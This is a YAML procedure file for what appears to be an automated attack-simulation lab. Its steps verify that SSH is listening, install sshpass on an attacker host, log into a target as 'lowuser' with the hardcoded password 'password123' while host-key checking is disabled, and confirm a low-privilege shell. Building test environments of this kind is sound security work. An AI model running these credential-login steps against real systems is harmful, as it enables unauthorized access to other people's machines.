procedure:
- action:
    command: ss -tlnp | grep ':22'
    type: exec_target
  expect:
    stdout_contains: :22
  outputs: {}
  session: null
  step_id: verify_ssh_listening
  timeout: 10
- action:
    command: apt-get install -y sshpass 2>/dev/null || true; which sshpass
    type: exec_attacker
  expect:
    stdout_contains: sshpass
  outputs: {}
  session: null
  step_id: install_sshpass
  timeout: 30
- action:
    command: sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
      lowuser@${target_host} 'id'
    type: exec_attacker
  expect:
    stdout_contains: uid=1001(lowuser)
  outputs: {}
  session: null
  step_id: brute_force_ssh
  timeout: 30
- action:
    command: sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
      lowuser@${target_host} 'id && whoami && groups'
    type: exec_attacker
  expect:
    stdout_regex: uid=1001\(lowuser\) gid=1001\(lowuser\) groups=1001\(lowuser\)
  outputs: {}
  session: null
  step_id: verify_low_privilege_shell
  timeout: 30
sessions: []
